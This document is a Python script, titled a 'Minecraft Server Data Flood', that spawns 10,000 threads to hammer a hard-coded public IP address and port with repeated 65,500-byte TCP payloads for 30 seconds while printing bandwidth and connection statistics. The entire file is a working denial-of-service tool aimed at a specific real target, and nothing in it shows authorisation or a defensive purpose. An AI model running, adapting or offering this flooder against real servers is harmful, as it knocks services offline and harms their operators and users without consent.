"""
Minecraft Server Data Flood - 10000 thread threading-only
"""
import socket, time, threading, sys
from colorama import init, Fore
init(autoreset=True)

TARGET_IP = "5.133.100.33"
TARGET_PORT = 25600
THREAD_COUNT = 10000
TEST_DURATION = 30
PAYLOAD_SIZE = 65500
PAYLOAD = b'x' * PAYLOAD_SIZE

# shared counters
bytes_sent = 0
connections = 0
errors = 0
lock = threading.Lock()

def flood_worker(stop):
    global bytes_sent, connections, errors
    while not stop.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.settimeout(3.0)
            s.connect((TARGET_IP, TARGET_PORT))
            s.sendall(PAYLOAD)
            with lock:
                bytes_sent += len(PAYLOAD)
                connections += 1
            s.close()
        except Exception:
            with lock:
                errors += 1

def main():
    print(f"[FLOOD] {THREAD_COUNT} threads x {PAYLOAD_SIZE}B to {TARGET_IP}:{TARGET_PORT}")
    print(f"[DURATION] {TEST_DURATION}s\n")

    # test connection
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3); s.connect((TARGET_IP, TARGET_PORT)); s.close()
        print("[OK] Connected\n")
    except Exception as e:
        print(f"[ERROR] {e}"); return

    stop = threading.Event()
    threads = []
    print("[START] Spawning threads...")
    for _ in range(THREAD_COUNT):
        t = threading.Thread(target=flood_worker, args=(stop,), daemon=True)
        t.start()
        threads.append(t)

    print("[RUN] Flooding...")
    start = time.time()
    try:
        while time.time() - start < TEST_DURATION:
            elapsed = time.time() - start
            with lock:
                b = bytes_sent; c = connections; e = errors
            rate = b / max(elapsed, 0.1)
            mbps = rate * 8 / 1_000_000
            er = (e / max(c + e, 1)) * 100
            alive = sum(1 for t in threads if t.is_alive())
            print(f"\r[TIME] {elapsed:.0f}s | "
                  f"[DATA] {b/1_000_000:.1f}MB | "
                  f"[RATE] {mbps:.0f}Mbps | "
                  f"[CONN] {c} ({c/max(elapsed,0.1):.0f}/s) | "
                  f"[ERR] {e} ({er:.1f}%) | "
                  f"[THR] {alive}/{THREAD_COUNT}", end="", flush=True)
            time.sleep(0.5)
    except KeyboardInterrupt:
        print("\n[STOP] User stop")

    stop.set()
    print("\n[WAIT] Joining threads...")
    for t in threads:
        t.join(timeout=1)

    elapsed = time.time() - start
    with lock:
        b = bytes_sent; c = connections; e = errors
    rate = b / max(elapsed, 0.1)
    mbps = rate * 8 / 1_000_000
    er = (e / max(c + e, 1)) * 100

    print(f"\n[RESULT]")
    print(f"[TIME] {elapsed:.1f}s")
    print(f"[DATA] {b/1_000_000:.1f}MB ({b:,} bytes)")
    print(f"[RATE] {mbps:.0f}Mbps ({rate:.0f} B/s)")
    print(f"[CONN] {c:,} ({c/max(elapsed,0.1):.0f}/s)")
    print(f"[ERR] {e:,} ({er:.1f}%)")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[STOP] Interrupted")
    except Exception as ex:
        print(f"[FATAL] {ex}")
